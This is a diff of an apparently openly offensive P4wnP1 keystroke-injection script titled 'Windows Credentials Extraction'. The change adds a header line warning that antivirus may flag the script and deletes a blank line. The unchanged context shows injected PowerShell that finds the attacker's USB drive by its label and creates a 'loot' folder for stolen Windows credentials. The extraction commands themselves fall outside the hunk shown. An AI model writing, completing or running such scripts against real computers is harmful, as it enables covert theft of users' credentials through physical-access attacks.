@@ -1,10 +1,12 @@
-/*###########################################################################
+/*##########################################################################\
 # Windows Credentials Extraction                                            #
 # Author: Coderdude112 on GitHub                                            #
 #                                                                           #
 # PREREQUISTES:                                                             #
 # Enable the keyboard and USB storage on your P4wnP1                        #
 # Set the name of the P4wnP1 USB storage device to the variable usb_drive   #
+#                                                                           #
+# ATTENTION: Some AntVir programs will flag this extraction!                #
 ###########################################################################*/
 
 // Set the keyboard layout and speed
@@ -26,7 +28,6 @@ function attack() {
     press("TAB");
     press("ENTER");
     delay(1000);
-
 
     type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq '" + usb_drive + "' } | select name;");   // Find the USB drive with the same name as the P4wnP1's name and save it as $usbPath
     type("$lootPath = $usbPath.name + \"extraction\\windows_credentials\";mkdir $lootPath;");                // Make the full loot path variable and then create it
